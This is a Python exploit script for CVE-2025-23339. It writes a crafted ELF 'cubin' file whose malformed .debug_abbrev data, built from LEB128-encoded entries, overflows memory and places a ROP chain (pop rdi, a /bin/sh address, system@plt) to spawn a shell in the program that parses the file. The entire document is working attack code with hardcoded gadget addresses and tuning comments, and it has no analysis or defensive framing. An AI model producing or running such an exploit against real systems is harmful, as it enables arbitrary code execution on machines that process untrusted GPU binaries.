#!/usr/bin/env python3
"""
CVE-2025-23339 - Use execve instead of system to avoid alignment issues
Or try one_gadget approach
"""

import struct
import sys

def encode_leb128(value):
    result = []
    while True:
        byte = value & 0x7f
        value >>= 7
        if value != 0:
            byte |= 0x80
        result.append(byte)
        if value == 0:
            break
    return bytes(result)

def build_cubin(content):
    strtab = b'\x00.shstrtab\x00.debug_abbrev\x00'
    ehdr_size, shnum = 64, 3
    shoff = ehdr_size
    strtab_off = shoff + shnum * 64
    debug_off = strtab_off + len(strtab)
    pad = (4 - (debug_off % 4)) % 4
    debug_off += pad
    
    elf = bytearray(64)
    elf[0:4] = b'\x7fELF'
    elf[4:8] = bytes([2, 1, 1, 7])
    struct.pack_into('<H', elf, 16, 0x3142)
    struct.pack_into('<H', elf, 18, 0xbe)
    struct.pack_into('<I', elf, 20, 1)
    struct.pack_into('<Q', elf, 40, shoff)
    struct.pack_into('<I', elf, 48, 0x340534)
    struct.pack_into('<H', elf, 52, 64)
    struct.pack_into('<H', elf, 58, 64)
    struct.pack_into('<H', elf, 60, shnum)
    struct.pack_into('<H', elf, 62, 1)
    
    sh_null = bytes(64)
    sh_str = bytearray(64)
    struct.pack_into('<I', sh_str, 0, 1)
    struct.pack_into('<I', sh_str, 4, 3)
    struct.pack_into('<Q', sh_str, 24, strtab_off)
    struct.pack_into('<Q', sh_str, 32, len(strtab))
    struct.pack_into('<Q', sh_str, 48, 1)
    
    sh_dbg = bytearray(64)
    struct.pack_into('<I', sh_dbg, 0, 11)
    struct.pack_into('<I', sh_dbg, 4, 1)
    struct.pack_into('<Q', sh_dbg, 24, debug_off)
    struct.pack_into('<Q', sh_dbg, 32, len(content))
    struct.pack_into('<Q', sh_dbg, 48, 4)
    
    return bytes(elf + sh_null + sh_str + sh_dbg + strtab + bytes(pad) + content)

def build_payload(rop, total_iters):
    p = bytearray()
    p += encode_leb128(4) + encode_leb128(0x33) + bytes([1])
    
    PAD = total_iters - len(rop)
    
    print(f"    Total iterations: {total_iters} (0x{total_iters:x})")
    print(f"    Padding: {PAD}, ROP: {len(rop)}")
    
    for _ in range(PAD):
        p += encode_leb128(4) + encode_leb128(0xa)
    
    for addr in rop:
        p += encode_leb128(addr & 0xFFFFFFFF)
        p += encode_leb128((addr >> 32) & 0xFFFFFFFF)
    
    p += bytes([0, 0, 0])
    return bytes(p)

if len(sys.argv) < 2:
    print("Usage: python3 exploit.py <output> [binsh] [total_iters]")
    print("  total_iters: exact number of iterations (default 0x108=264)")
    sys.exit(1)

output = sys.argv[1]
binsh = int(sys.argv[2], 0) if len(sys.argv) > 2 else 0x7ffff7dcb42f
total_iters = int(sys.argv[3], 0) if len(sys.argv) > 3 else 0x107  # Try 0x107 instead of 0x108

pop_rdi = 0x402d1b
ret = 0x402d1c  
system_plt = 0x401d90

# Simpler ROP - just what we need
# The ret for alignment might not be needed if we get iteration count right
rop = [pop_rdi, binsh, system_plt]

print(f"[*] CVE-2025-23339 Exploit")
print(f"[*] /bin/sh: 0x{binsh:x}")
print(f"[*] ROP: pop_rdi -> binsh -> system")

payload = build_payload(rop, total_iters)
elf = build_cubin(payload)

with open(output, 'wb') as f:
    f.write(elf)

print(f"\n[+] Written: {output}")
